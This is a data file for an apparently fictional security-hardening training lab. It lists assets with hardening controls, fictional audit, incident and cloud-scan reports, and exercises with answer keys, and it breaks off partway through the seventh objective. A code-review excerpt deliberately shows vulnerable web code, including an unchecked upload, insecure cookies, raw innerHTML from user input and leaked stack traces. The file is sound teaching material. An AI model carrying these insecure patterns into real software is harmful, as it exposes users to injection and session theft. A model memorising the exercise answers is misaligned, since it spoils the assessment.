// Northwind Hardening Yard - lab data (auto-dumped 1:1 from the original
// TypeScript sources; do not hand-edit content, regenerate instead).
// All assets, logs, configs and documents are FICTIONAL training data.
'use strict';
window.LAB_DATA = {
  "ZONES": [
    {
      "id": "endpoints",
      "name": "Endpoint Workshop",
      "sub": "Workstations & servers"
    },
    {
      "id": "mobile",
      "name": "Yard Ops Deck",
      "sub": "Mobile & embedded/OT"
    },
    {
      "id": "network",
      "name": "Perimeter Yard",
      "sub": "Wireless, segmentation, VPN"
    },
    {
      "id": "appsdata",
      "name": "Data Vault & App Factory",
      "sub": "Applications, data, cloud"
    }
  ],
  "ZONE_NOTE": {
    "endpoints": "Hardening targets: workstations and servers. Disable what you do not need, rotate what ships by default, encrypt what moves, patch what remains.",
    "mobile": "Mobile devices live or die by MDM; embedded and OT systems live or die by segmentation and physical access. Deployment models (BYOD / COPE / CYOD) decide who owns what.",
    "network": "Segmentation (VLANs, screened subnet), modern Wi-Fi (WPA3 + 802.1X/RADIUS), WIDS/WIPS, VPN and DNS filtering form the yards fences.",
    "appsdata": "Applications take the input abuse; data takes the exfiltration abuse. Validation, secure cookies, code signing on one side; encryption, tokenization, masking and DLP on the other."
  },
  "ASSETS": [
    {
      "id": "WS-OPS-01",
      "name": "Dispatch workstation",
      "kind": "Workstation - Windows, ops floor",
      "zone": "endpoints",
      "note": "Runs the freight scheduling client. Currently a soft target: legacy service enabled, vendor default admin password, unencrypted disk.",
      "controls": [
        {
          "id": "smbv1",
          "label": "Disable legacy SMBv1 service/ports",
          "kind": "toggle",
          "good": true,
          "why": "Unneeded services and ports are open doors; disabling them shrinks the attack surface."
        },
        {
          "id": "creds",
          "label": "Rotate default admin password",
          "kind": "toggle",
          "good": true,
          "why": "Default and common passwords are public knowledge on the internet; changing them is day-one hardening."
        },
        {
          "id": "fde",
          "label": "Full-disk encryption",
          "kind": "toggle",
          "good": true,
          "why": "Protects data at rest if the laptop is stolen or the drive is pulled."
        },
        {
          "id": "hfw",
          "label": "Host-based firewall + IPS",
          "kind": "toggle",
          "good": true,
          "why": "Stops lateral movement and hostile inbound connections at the machine itself."
        },
        {
          "id": "edr",
          "label": "EDR agent enrolled",
          "kind": "toggle",
          "good": true,
          "why": "Endpoint Detection & Response watches process behaviour, not just signatures."
        },
        {
          "id": "patch",
          "label": "Automated patching",
          "kind": "toggle",
          "good": true,
          "why": "Patching closes the vulnerabilities that everything else assumes are closed."
        }
      ],
      "initial": {
        "smbv1": false,
        "creds": false,
        "fde": false,
        "hfw": true,
        "edr": false,
        "patch": false
      }
    },
    {
      "id": "SRV-FILE-01",
      "name": "File server",
      "kind": "Server - share + backup staging",
      "zone": "endpoints",
      "note": "Ships with a bloated install: sample services running, vendor default credentials on the management console.",
      "controls": [
        {
          "id": "services",
          "label": "Disable unnecessary services",
          "kind": "toggle",
          "good": true,
          "why": "A hardened server runs only its role; everything else is attack surface."
        },
        {
          "id": "creds",
          "label": "Rotate default credentials",
          "kind": "toggle",
          "good": true,
          "why": "Default service and console passwords are the first thing an attacker tries."
        },
        {
          "id": "hips",
          "label": "Host-based IPS",
          "kind": "toggle",
          "good": true,
          "why": "Inspects traffic to the server and blocks exploit attempts inline."
        },
        {
          "id": "baseline",
          "label": "Secure baseline applied",
          "kind": "toggle",
          "good": true,
          "why": "A documented, approved configuration baseline makes drift visible."
        },
        {
          "id": "integrity",
          "label": "File integrity monitoring",
          "kind": "toggle",
          "good": true,
          "why": "Alerts when system files or configs change outside a change window."
        }
      ],
      "initial": {
        "services": false,
        "creds": false,
        "hips": false,
        "baseline": false,
        "integrity": false
      }
    },
    {
      "id": "SRV-EXCH-01",
      "name": "Mail/relay server",
      "kind": "Server - internet-facing",
      "zone": "endpoints",
      "note": "Internet-facing. Appears in audit report DOC-01.",
      "controls": [
        {
          "id": "patch",
          "label": "Patching current",
          "kind": "toggle",
          "good": true,
          "why": "Internet-facing servers are probed within minutes; patches must be current."
        },
        {
          "id": "edr",
          "label": "EDR agent enrolled",
          "kind": "toggle",
          "good": true,
          "why": "Behavioral telemetry on an internet-facing host is non-negotiable."
        },
        {
          "id": "baseline",
          "label": "Secure baseline applied",
          "kind": "toggle",
          "good": true,
          "why": "Baseline documents the approved state so audit can measure drift."
        }
      ],
      "initial": {
        "patch": false,
        "edr": false,
        "baseline": false
      }
    },
    {
      "id": "PH-DRV-14",
      "name": "Driver smartphone",
      "kind": "Phone - personally owned (BYOD)",
      "zone": "mobile",
      "note": "Driver-owned phone used for route manifests. Personal device: the company may only manage a work container.",
      "controls": [
        {
          "id": "mdm",
          "label": "MDM enrollment (work profile)",
          "kind": "toggle",
          "good": true,
          "why": "Mobile Device Management enforces policy on the work side of a personal device."
        },
        {
          "id": "container",
          "label": "Work containerization",
          "kind": "toggle",
          "good": true,
          "why": "Separates corporate data from personal apps so a wipe never touches family photos."
        },
        {
          "id": "lock",
          "label": "Screen lock + biometrics",
          "kind": "toggle",
          "good": true,
          "why": "A phone is lost every minute somewhere; the lock screen is the first control."
        },
        {
          "id": "wipe",
          "label": "Remote wipe (work data)",
          "kind": "toggle",
          "good": true,
          "why": "Lost device? Corporate data can be erased remotely without touching personal data."
        },
        {
          "id": "enc",
          "label": "Full-device encryption",
          "kind": "toggle",
          "good": true,
          "why": "Modern phones default to it, but policy must verify it is on."
        },
        {
          "id": "geotag",
          "label": "Location tagging (geotagging)",
          "kind": "toggle",
          "good": false,
          "why": "Geotagged photos and telemetry leak routes, yards and even home addresses; keep OFF on BYOD."
        }
      ],
      "initial": {
        "mdm": false,
        "container": false,
        "lock": true,
        "wipe": false,
        "enc": true,
        "geotag": true
      }
    },
    {
      "id": "TBL-WHS-03",
      "name": "Warehouse tablet",
      "kind": "Tablet - corporate-owned (COPE)",
      "zone": "mobile",
      "note": "Corporate-owned, personally enabled: scanning gun by day, allow-listed personal use by night.",
      "controls": [
        {
          "id": "mdm",
          "label": "MDM enrollment",
          "kind": "toggle",
          "good": true,
          "why": "COPE devices are fully manageable: MDM is the policy backbone."
        },
        {
          "id": "allowlist",
          "label": "Application allow list",
          "kind": "toggle",
          "good": true,
          "why": "Only approved apps install; allow lists beat block lists for locked-down fleets."
        },
        {
          "id": "geofence",
          "label": "Geofencing policy",
          "kind": "toggle",
          "good": true,
          "why": "Device policy changes (or alerts fire) when the tablet leaves the yard geofence."
        },
        {
          "id": "enc",
          "label": "Full-device encryption",
          "kind": "toggle",
          "good": true,
          "why": "The tablet holds manifests and scans; encrypt the whole device."
        },
        {
          "id": "wipe",
          "label": "Remote wipe",
          "kind": "toggle",
          "good": true,
          "why": "Corporate-owned means corporate data can be fully wiped if lost."
        }
      ],
      "initial": {
        "mdm": false,
        "allowlist": false,
        "geofence": false,
        "enc": false,
        "wipe": false
      }
    },
    {
      "id": "ICS-CRANE-01",
      "name": "Crane PLC",
      "kind": "SCADA/ICS - programmable logic controller",
      "zone": "mobile",
      "note": "Controls the container crane. Safety-critical OT: wrong packets can move steel.",
      "controls": [
        {
          "id": "segment",
          "label": "OT network segmentation",
          "kind": "toggle",
          "good": true,
          "why": "OT/SCADA must live in its own segmented zone - never flat with IT."
        },
        {
          "id": "phys",
          "label": "Physical access control",
          "kind": "toggle",
          "good": true,
          "why": "A PLC with an open cabinet is a one-screw compromise; lock the cabinet, log the access."
        },
        {
          "id": "creds",
          "label": "Rotate default PLC credentials",
          "kind": "toggle",
          "good": true,
          "why": "ICS default passwords are published in vendor manuals."
        },
        {
          "id": "patch",
          "label": "OT-safe patch window",
          "kind": "toggle",
          "good": true,
          "why": "Patching OT needs vendor-tested windows; skipping it forever is not an option either."
        }
      ],
      "initial": {
        "segment": false,
        "phys": false,
        "creds": false,
        "patch": false
      }
    },
    {
      "id": "IOT-THRM-07",
      "name": "HVAC IoT sensor",
      "kind": "IoT - dedicated appliance",
      "zone": "mobile",
      "note": "Smart thermostat in the cold-store. The classic vendor-backdoor asset.",
      "controls": [
        {
          "id": "creds",
          "label": "Change default credentials",
          "kind": "toggle",
          "good": true,
          "why": "IoT default passwords are the most exploited credential class in the world."
        },
        {
          "id": "segment",
          "label": "Segmented network access",
          "kind": "toggle",
          "good": true,
          "why": "An IoT sensor only needs to reach its broker - give it a segment, not the LAN."
        },
        {
          "id": "firmware",
          "label": "Firmware updates enabled",
          "kind": "toggle",
          "good": true,
          "why": "IoT firmware is the patch channel for these appliances; enable and schedule it."
        }
      ],
      "initial": {
        "creds": false,
        "segment": false,
        "firmware": false
      }
    },
    {
      "id": "RTOS-GATE-02",
      "name": "Yard gate controller",
      "kind": "RTOS - real-time operating system",
      "zone": "mobile",
      "note": "Real-time OS with hard timing guarantees. You cannot just \"install AV\" on it.",
      "controls": [
        {
          "id": "debug",
          "label": "Disable debug/JTAG ports & services",
          "kind": "toggle",
          "good": true,
          "why": "Debug interfaces left enabled are a physical bypass of every software control."
        },
        {
          "id": "signed",
          "label": "Signed firmware only",
          "kind": "toggle",
          "good": true,
          "why": "RTOS devices should refuse to boot firmware without a valid vendor signature."
        },
        {
          "id": "phys",
          "label": "Physical access control",
          "kind": "toggle",
          "good": true,
          "why": "Embedded devices are compromised through the cabinet as often as through the network."
        }
      ],
      "initial": {
        "debug": false,
        "signed": false,
        "phys": false
      }
    },
    {
      "id": "AP-DOCK-01",
      "name": "Dock Wi-Fi AP",
      "kind": "Wireless access point",
      "zone": "network",
      "note": "Shipped years ago, configured once, forgotten. Its radio reaches the public street.",
      "controls": [
        {
          "id": "proto",
          "label": "Wi-Fi security protocol",
          "kind": "choice",
          "good": "wpa3",
          "why": "WEP is broken, WPA2-TKIP is deprecated; WPA3 with 802.1X/RADIUS is the current standard.",
          "choices": [
            {
              "id": "wep",
              "label": "WEP (open PSK, 40/104-bit)"
            },
            {
              "id": "wpa2tkip",
              "label": "WPA2 with TKIP"
            },
            {
              "id": "wpa3",
              "label": "WPA3 + 802.1X/RADIUS (AAA)"
            }
          ]
        },
        {
          "id": "wids",
          "label": "WIDS/WIPS monitoring",
          "kind": "toggle",
          "good": true,
          "why": "Wireless Intrusion Detection/Prevention spots rogue APs and deauth attacks."
        },
        {
          "id": "guestiso",
          "label": "Guest SSID isolated from corporate VLAN",
          "kind": "toggle",
          "good": true,
          "why": "Guests must never share a broadcast domain with corporate assets."
        }
      ],
      "initial": {
        "proto": "wep",
        "wids": false,
        "guestiso": false
      }
    },
    {
      "id": "SW-CORE-01",
      "name": "Core switch",
      "kind": "Switch - layer 2",
      "zone": "network",
      "note": "Everything is currently in VLAN 1: offices, guests, crane, printers.",
      "controls": [
        {
          "id": "vlan",
          "label": "VLAN segmentation",
          "kind": "toggle",
          "good": true,
          "why": "VLANs split the flat network into trust zones and bound broadcast/blast radius."
        },
        {
          "id": "macfilter",
          "label": "Port MAC filtering",
          "kind": "toggle",
          "good": true,
          "why": "Binds switch ports to known device MACs - crude but effective against casual plug-in attacks."
        },
        {
          "id": "ports",
          "label": "Disable unused ports/services",
          "kind": "toggle",
          "good": true,
          "why": "An unused port is a free network drop for anyone who walks past."
        }
      ],
      "initial": {
        "vlan": false,
        "macfilter": false,
        "ports": false
      }
    },
    {
      "id": "FW-EDGE-01",
      "name": "Edge firewall",
      "kind": "Firewall - perimeter",
      "zone": "network",
      "note": "Doing NAT well, doing segmentation badly.",
      "controls": [
        {
          "id": "dmz",
          "label": "Screened subnet (DMZ) for public services",
          "kind": "toggle",
          "good": true,
          "why": "Public-facing servers belong in a screened subnet between two firewall legs."
        },
        {
          "id": "ingress",
          "label": "Ingress/egress filtering",
          "kind": "toggle",
          "good": true,
          "why": "Filtering both directions stops spoofed inbound traffic and silent exfil paths."
        },
        {
          "id": "siem",
          "label": "Log to SIEM",
          "kind": "toggle",
          "good": true,
          "why": "Unlogged firewalls detect nothing; ship the logs to the SIEM."
        }
      ],
      "initial": {
        "dmz": false,
        "ingress": true,
        "siem": false
      }
    },
    {
      "id": "RTR-BRANCH-01",
      "name": "Branch router",
      "kind": "Router - site-to-site",
      "zone": "network",
      "note": "Links the two depots. Currently managed over telnet, firmware from another administration.",
      "controls": [
        {
          "id": "vpn",
          "label": "Site-to-site VPN (IPsec)",
          "kind": "toggle",
          "good": true,
          "why": "Traffic between sites crosses the internet encrypted or not at all."
        },
        {
          "id": "ssh",
          "label": "Admin via SSH only (no telnet)",
          "kind": "toggle",
          "good": true,
          "why": "Telnet sends credentials in cleartext; SSH encrypts the management plane."
        },
        {
          "id": "firmware",
          "label": "Firmware current",
          "kind": "toggle",
          "good": true,
          "why": "Router firmware fixes actively exploited vulnerabilities."
        }
      ],
      "initial": {
        "vpn": false,
        "ssh": false,
        "firmware": false
      }
    },
    {
      "id": "DNS-FILT-01",
      "name": "Recursive resolvers",
      "kind": "DNS service",
      "zone": "network",
      "note": "Forwards everything, filters nothing.",
      "controls": [
        {
          "id": "filter",
          "label": "DNS filtering (malicious domains)",
          "kind": "toggle",
          "good": true,
          "why": "Blocks known-bad domains - one of the cheapest detections you will ever deploy."
        }
      ],
      "initial": {
        "filter": false
      }
    },
    {
      "id": "APP-PORTAL-01",
      "name": "Customer portal",
      "kind": "Web application - public",
      "zone": "appsdata",
      "note": "Booking portal. Fielded quickly; security debt visible in DOC-04 code review.",
      "controls": [
        {
          "id": "validation",
          "label": "Input validation (server-side)",
          "kind": "toggle",
          "good": true,
          "why": "Validate type, length, range and format of every input before it touches logic or a query."
        },
        {
          "id": "encoding",
          "label": "Output encoding / sanitization",
          "kind": "toggle",
          "good": true,
          "why": "Encode output so injected scripts render as text, not code (XSS defense)."
        },
        {
          "id": "cookies",
          "label": "Secure cookies (Secure + HttpOnly)",
          "kind": "toggle",
          "good": true,
          "why": "Secure flag forces HTTPS transport; HttpOnly hides the cookie from JavaScript."
        },
        {
          "id": "signing",
          "label": "Code signing for release builds",
          "kind": "toggle",
          "good": true,
          "why": "Signed builds prove the artifact was not tampered with after CI."
        },
        {
          "id": "sast",
          "label": "Static code analysis in CI",
          "kind": "toggle",
          "good": true,
          "why": "SAST catches the flaw class before it ships, not after."
        },
        {
          "id": "headers",
          "label": "Header manipulation checks",
          "kind": "toggle",
          "good": true,
          "why": "Never trust headers; validate anything that arrives in the request header."
        }
      ],
      "initial": {
        "validation": false,
        "encoding": false,
        "cookies": false,
        "signing": false,
        "sast": false,
        "headers": false
      }
    },
    {
      "id": "DB-CRM-01",
      "name": "Customer database",
      "kind": "Database - PII + card data",
      "zone": "appsdata",
      "note": "Holds shipper PII and card numbers for billing.",
      "controls": [
        {
          "id": "encRest",
          "label": "Encryption at rest",
          "kind": "toggle",
          "good": true,
          "why": "Protects the data if the disk, snapshot or backup is taken."
        },
        {
          "id": "encTransit",
          "label": "Encryption in transit (TLS)",
          "kind": "toggle",
          "good": true,
          "why": "Client-to-DB connections must be encrypted end to end."
        },
        {
          "id": "token",
          "label": "Tokenization of card numbers",
          "kind": "toggle",
          "good": true,
          "why": "Swaps card numbers for worthless tokens; the vault is separate."
        },
        {
          "id": "mask",
          "label": "Data masking for support views",
          "kind": "toggle",
          "good": true,
          "why": "Support sees ****-1234, not the full number."
        },
        {
          "id": "dlp",
          "label": "DLP egress rules",
          "kind": "toggle",
          "good": true,
          "why": "Data Loss Prevention flags or blocks bulk exports and uploads of classified data."
        },
        {
          "id": "keys",
          "label": "Key management & rotation",
          "kind": "toggle",
          "good": true,
          "why": "Encryption without key hygiene is a lock with the key taped to the door."
        }
      ],
      "initial": {
        "encRest": false,
        "encTransit": false,
        "token": false,
        "mask": false,
        "dlp": false,
        "keys": false
      }
    },
    {
      "id": "CLOUD-SAAS-01",
      "name": "SaaS estate",
      "kind": "Cloud - 40+ SaaS apps",
      "zone": "appsdata",
      "note": "Marketing signed up for apps nobody inventoried.",
      "controls": [
        {
          "id": "casb",
          "label": "CASB discovery & policy",
          "kind": "toggle",
          "good": true,
          "why": "Cloud Access Security Broker finds shadow SaaS and enforces policy on it."
        },
        {
          "id": "cspm",
          "label": "CSPM posture scans",
          "kind": "toggle",
          "good": true,
          "why": "Cloud Security Posture Management inventories misconfigurations across the estate."
        }
      ],
      "initial": {
        "casb": false,
        "cspm": false
      }
    },
    {
      "id": "VDI-DESK-01",
      "name": "Contractor desktops",
      "kind": "Virtual Desktop Infrastructure",
      "zone": "appsdata",
      "note": "Seasonal contractors currently get full laptops loaded with local data.",
      "controls": [
        {
          "id": "vdi",
          "label": "VDI (apps streamed, no local data)",
          "kind": "toggle",
          "good": true,
          "why": "Virtual Desktops keep data in the datacenter; the endpoint is a window."
        },
        {
          "id": "redirect",
          "label": "Clipboard/USB redirection disabled",
          "kind": "toggle",
          "good": true,
          "why": "A VDI session leaks nothing if the clipboard and USB channels are closed."
        }
      ],
      "initial": {
        "vdi": false,
        "redirect": false
      }
    }
  ],
  "EVIDENCE_DOCS": [
    {
      "id": "DOC-01",
      "title": "Baseline audit report - Q3 (excerpt)",
      "tag": "AUDIT",
      "body": [
        "TRAINING DATA - fictional audit of a fictional organization.",
        "",
        "WS-OPS-01 (workstation, ops floor): SMBv1 enabled; local admin password unchanged from vendor default; disk unencrypted. Not internet-facing.",
        "SRV-EXCH-01 (mail/relay server): INTERNET-FACING. Patch level 14 months out of date; EDR agent not installed; management console still uses vendor default credentials; no secure baseline recorded.",
        "IOT-THRM-07 (HVAC sensor): default credentials in use; sits on the same VLAN as payroll workstations.",
        "AP-DOCK-01 (dock Wi-Fi): WEP in use; WIDS disabled.",
        "",
        "Auditor note: assets were scored on exposure (internet reachability), privilege (default credentials), and detectability (no EDR/baseline)."
      ]
    },
    {
      "id": "DOC-02",
      "title": "Incident timeline - \"Operation Night Haul\"",
      "tag": "IR REPORT",
      "body": [
        "TRAINING DATA - fictional incident reconstruction.",
        "",
        "STAGE 1 (Day 0, 02:14) - Actor logs into SW-CORE-01 management interface with the vendor default password (never rotated) and switches the port of the crane PLC into the office VLAN.",
        "STAGE 2 (Day 0, 02:31) - From the crane PLC the actor reaches DB-CRM-01 directly: no VLAN separation existed between OT and corporate.",
        "STAGE 3 (Day 3) - Actor uploads a \"shipment photo\" trojan file to APP-PORTAL-01; the upload field accepted any content, any size, any type.",
        "STAGE 4 (Day 4-9) - Actor bulk-exports 212,000 customer records through the support tooling. No rule flagged the export.",
        "STAGE 5 (Day 9, gate) - A yard supervisor’s laptop is stolen from a truck cab. The disk was unencrypted; manifests and client contracts readable.",
        "",
        "Post-incident note: every stage exploited the ABSENCE of a single common hardening technique from objective 4.1."
      ]
    },
    {
      "id": "DOC-03",
      "title": "Wireless config dump + capture note",
      "tag": "WIRELESS",
      "body": [
        "TRAINING DATA - fictional config export.",
        "",
        "AP-DOCK-01# show running-config",
        " dot11 ssid NWF-DOCK",
        "  authentication open",
        "  wpa-psk ascii 7 <redacted>",
        "  encryption mode ciphers tkip",
        " dot11 ssid NWF-GUEST",
        "  authentication open",
        "  no isolation",
        " wids enable: NO",
        "",
        "Capture note (wardrive, parking lot): 4-way handshakes for NWF-DOCK captured in 6 minutes. Handshake material is sufficient for an OFFLINE DICTIONARY ATTACK against the pre-shared key. No rogue-AP monitoring was observed on any channel."
      ]
    },
    {
      "id": "DOC-04",
      "title": "Code review - APP-PORTAL-01 (lines 40-77)",
      "tag": "CODE",
      "body": [
        "TRAINING DATA - fictional code, simplified for training.",
        "",
        "L40  app.post(\"/uploads\", (req) => {",
        "L41    const f = req.files.shipmentPhoto;   // filename, type, size NOT checked",
        "L42    saveToDisk(f);",
        "L43  })",
        "",
        "L52  res.cookie(\"nw_session\", token, { path: \"/\" });   // no Secure, no HttpOnly",
        "",
        "L60  searchResults.forEach(r => resultsEl.innerHTML += r.comment);  // raw HTML from user comments",
        "",
        "L70  const sha = require(\"left-pad-checker@1.0.0\");  // pinned by tag, unsigned, unknown publisher",
        "",
        "L77  res.status(500).send(err.stack);   // full stack trace sent to the client"
      ]
    },
    {
      "id": "DOC-05",
      "title": "CSPM findings - first scan",
      "tag": "CLOUD",
      "body": [
        "TRAINING DATA - fictional posture scan.",
        "",
        "F-1  Storage bucket \"nw-crm-exports\" is publicly readable; contains customer PII dumps.",
        "F-2  VM \" Relay-Prod-02\" has no EDR agent installed.",
        "F-3  Admin account \"ops-root\" has MFA disabled.",
        "F-4  Storage account accepts TLS 1.0 connections.",
        "F-5  Instance \"Dev-Test-017\" follows the approved naming convention for dev machines.",
        "F-6  Cost anomaly of $0.02 detected on subscription 4471."
      ]
    }
  ],
  "MEDIUM_OBJECTIVES": [
    {
      "id": "OBJ-M1",
      "pillar": "P1",
      "title": "Match each endpoint hardening technique to what it actually does.",
      "anchor": "Secure endpoints (methods): disable ports/services, default passwords, UEFI/BIOS passwords, full-disk encryption, host-based firewall/IPS, EDR",
      "brief": "Before you touch a single switch, prove you know the toolbox. These six techniques cover most of the endpoint bullet of the objective.",
      "location": "Work the matcher below - no evidence needed.",
      "exercise": {
        "type": "match",
        "prompt": "Pick the technique that performs each job.",
        "items": [
          {
            "id": "i1",
            "label": "Closes network doors you never use"
          },
          {
            "id": "i2",
            "label": "Removes passwords shipped as \"admin/admin\""
          },
          {
            "id": "i3",
            "label": "Stops a boot-menu bypass of OS logon"
          },
          {
            "id": "i4",
            "label": "Renders a stolen drive unreadable"
          },
          {
            "id": "i5",
            "label": "Filters hostile traffic on the machine itself"
          },
          {
            "id": "i6",
            "label": "Watches process behaviour and can roll back ransomware"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "Disable unnecessary ports and services"
          },
          {
            "id": "o2",
            "label": "Change default/common passwords"
          },
          {
            "id": "o3",
            "label": "UEFI/BIOS supervisor password"
          },
          {
            "id": "o4",
            "label": "Full-disk encryption"
          },
          {
            "id": "o5",
            "label": "Host-based firewall/IPS"
          },
          {
            "id": "o6",
            "label": "EDR (Endpoint Detection & Response)"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4",
          "i5": "o5",
          "i6": "o6"
        }
      },
      "feedback": "These six are the endpoint backbone: shrink the surface (ports/services), remove known credentials (defaults + UEFI), protect data at rest (FDE), filter traffic (host firewall/IPS) and add behavioral telemetry (EDR). A defender deploys them as one baseline, not one-by-one.",
      "hints": [
        "Think about WHERE each control acts: the network stack, the credential store, the boot firmware, the disk, the machine’s traffic, the process table.",
        "\"Stops a boot-menu bypass\" is about firmware, not Windows.",
        "i6 is the behavioral one - antivirus on steroids with response capability: EDR."
      ]
    },
    {
      "id": "OBJ-M2",
      "pillar": "P4",
      "title": "Harden the dispatch workstation WS-OPS-01.",
      "anchor": "Secure endpoints: all six hardening methods applied to one workstation",
      "brief": "WS-OPS-01 currently runs SMBv1, still has the vendor default admin password, and its disk is wide open. Apply the full endpoint baseline.",
      "location": "Endpoint Workshop → WS-OPS-01.",
      "zone": "endpoints",
      "exercise": {
        "type": "toggles",
        "todo": "Set every hardening control on WS-OPS-01 to its hardened state (all six ON).",
        "required": {
          "WS-OPS-01.smbv1": true,
          "WS-OPS-01.creds": true,
          "WS-OPS-01.fde": true,
          "WS-OPS-01.hfw": true,
          "WS-OPS-01.edr": true,
          "WS-OPS-01.patch": true
        }
      },
      "feedback": "That is a complete endpoint baseline in one card: service removed, credentials rotated, data encrypted at rest, host firewall on, EDR watching, patching automated. Notice the meter: hardening is measured against the applied state, not the intention.",
      "hints": [
        "Open the Yard Map → Endpoint Workshop and find WS-OPS-01.",
        "All six switches on this card should end up ON - including the one that ships ON already (host firewall).",
        "You are aiming for a green posture bar on WS-OPS-01: 6/6."
      ]
    },
    {
      "id": "OBJ-M3",
      "pillar": "P1",
      "title": "Match the mobile & embedded vocabulary before managing it.",
      "anchor": "Mobile devices (MDM, containerization, remote wipe, geofencing) + Embedded systems (RTOS, SCADA/ICS)",
      "brief": "The mobile and embedded bullets are vocabulary-dense. Get the six terms right - they decide what you may do to a device.",
      "location": "Matcher below.",
      "exercise": {
        "type": "match",
        "prompt": "Pick the term each sentence describes.",
        "items": [
          {
            "id": "i1",
            "label": "Policy backbone that enforces encryption, locks and apps on a fleet"
          },
          {
            "id": "i2",
            "label": "Separates corporate data from personal apps on one device"
          },
          {
            "id": "i3",
            "label": "Erases corporate data on a lost device from a console"
          },
          {
            "id": "i4",
            "label": "Triggers policy when a device leaves a defined area"
          },
          {
            "id": "i5",
            "label": "OS with hard timing guarantees, common on gate controllers"
          },
          {
            "id": "i6",
            "label": "Industrial control system supervising cranes and plant equipment"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "MDM (Mobile Device Management)"
          },
          {
            "id": "o2",
            "label": "Containerization"
          },
          {
            "id": "o3",
            "label": "Remote wipe"
          },
          {
            "id": "o4",
            "label": "Geofencing"
          },
          {
            "id": "o5",
            "label": "RTOS (Real-Time Operating System)"
          },
          {
            "id": "o6",
            "label": "SCADA/ICS"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4",
          "i5": "o5",
          "i6": "o6"
        }
      },
      "feedback": "Vocabulary drives the exam: MDM enforces, containerization separates, remote wipe erases, geofencing reacts to location, RTOS is about timing guarantees, SCADA/ICS is industrial control. Note geofencing vs geotagging: fencing is a defensive policy, tagging is a data leak risk.",
      "hints": [
        "Two terms are about location - one is a policy trigger, the other does not appear here (that one is geotagging, a leak).",
        "The crane asset in the yard is the SCADA/ICS example.",
        "i5: \"hard timing guarantees\" is the defining property of a Real-Time OS."
      ]
    },
    {
      "id": "OBJ-M4",
      "pillar": "P4",
      "title": "Configure the COPE warehouse tablet’s MDM policy.",
      "anchor": "Mobile devices: MDM, screen locks, remote wipe, full-device encryption, geofencing, allow lists",
      "brief": "TBL-WHS-03 is corporate-owned, personally enabled. Lock it down the way an MDM admin would - all five policy controls.",
      "location": "Yard Ops Deck → TBL-WHS-03.",
      "zone": "mobile",
      "exercise": {
        "type": "toggles",
        "todo": "Enable all five MDM controls on TBL-WHS-03.",
        "required": {
          "TBL-WHS-03.mdm": true,
          "TBL-WHS-03.allowlist": true,
          "TBL-WHS-03.geofence": true,
          "TBL-WHS-03.enc": true,
          "TBL-WHS-03.wipe": true
        }
      },
      "feedback": "Full COPE posture: MDM enrolled, only allow-listed apps, geofence policy, device encryption and remote wipe. Contrast with PH-DRV-14 next door - a BYOD phone can only get a container and a work-profile wipe, never a full-device wipe.",
      "hints": [
        "COPE = corporate-owned, personally enabled: the company may manage the whole device.",
        "All five switches on the TBL-WHS-03 card go ON.",
        "Allow list, geofence, encryption, wipe - and the enrollment switch itself."
      ]
    },
    {
      "id": "OBJ-M5",
      "pillar": "P4",
      "title": "Segment and lock down the OT/IoT assets.",
      "anchor": "Embedded systems: RTOS, IoT, SCADA/ICS - system capabilities, segmented network access, physical access control",
      "brief": "The crane PLC and the HVAC sensor are the two assets most likely to burn the yard down. Embedded hardening is mostly segmentation, physical access and credentials.",
      "location": "Yard Ops Deck → ICS-CRANE-01 and IOT-THRM-07.",
      "zone": "mobile",
      "exercise": {
        "type": "toggles",
        "todo": "Apply all four controls on ICS-CRANE-01 and all three on IOT-THRM-07.",
        "required": {
          "ICS-CRANE-01.segment": true,
          "ICS-CRANE-01.phys": true,
          "ICS-CRANE-01.creds": true,
          "ICS-CRANE-01.patch": true,
          "IOT-THRM-07.creds": true,
          "IOT-THRM-07.segment": true,
          "IOT-THRM-07.firmware": true
        }
      },
      "feedback": "Both assets now live in their own segment with rotated credentials; the crane cabinet is physically locked and has an OT-safe patch window; the sensor gets firmware updates. This is exactly the Target-2013 lesson: an HVAC appliance on a flat network became the doorway.",
      "hints": [
        "Embedded hardening leans on three ideas: segmentation, physical access, credentials.",
        "The crane card has four switches, the sensor card has three - every one of them belongs ON.",
        "OT patching still happens - it just needs vendor-tested maintenance windows."
      ]
    },
    {
      "id": "OBJ-M6",
      "pillar": "P4",
      "title": "Build the segmented perimeter.",
      "anchor": "Secure networks: VLAN segmentation, screened subnet, DNS filtering",
      "brief": "The core switch runs one flat VLAN, the firewall has no DMZ, and resolvers filter nothing. Fix all three.",
      "location": "Perimeter Yard → SW-CORE-01, FW-EDGE-01, DNS-FILT-01.",
      "zone": "network",
      "exercise": {
        "type": "toggles",
        "todo": "Enable VLAN segmentation (SW-CORE-01), the screened subnet (FW-EDGE-01) and DNS filtering (DNS-FILT-01).",
        "required": {
          "SW-CORE-01.vlan": true,
          "FW-EDGE-01.dmz": true,
          "DNS-FILT-01.filter": true
        }
      },
      "feedback": "Three structural controls: VLANs create internal trust zones, the screened subnet gives public services their own blast radius between firewall legs, and DNS filtering blocks known-bad domains for every host at once. Segmentation is the control that would have contained the Night Haul timeline at stage 2.",
      "hints": [
        "One switch per asset: the switch, the firewall, the resolver.",
        "Look for labels containing \"VLAN\", \"screened subnet (DMZ)\" and \"DNS filtering\".",
        "Three toggles total - all ON."
      ]
    },
    {
      "id": "OBJ-M7",
      "pillar": "P3",
      "title": "Fix the dock Wi-Fi and turn on wireless detection.",
      "anchor": "Secure networks: WEP/WPA/WPA2/WPA3, AAA/RADIUS, WIDS/WIPS, guest isolation",
      "brief": "AP-DOCK-01 still radiates WEP to the parking lot and monitors nothing. Replace the broken protocol, enable wireless intrusion detection, and cage the guest network.",
      "location": "Perimeter Yard → AP-DOCK-01 (read the protocol line first).",
      "zone": "network",
      "exercise": {
        "type": "toggles",
        "todo": "Set the Wi-Fi protocol to WPA3 + 802.1X/RADIUS, enable WIDS/WIPS, and isolate the guest SSID.",
        "required": {
          "AP-DOCK-01.proto": "wpa3",
          "AP-DOCK-01.wids": true,
          "AP-DOCK-01.guestiso": true
        }
      },
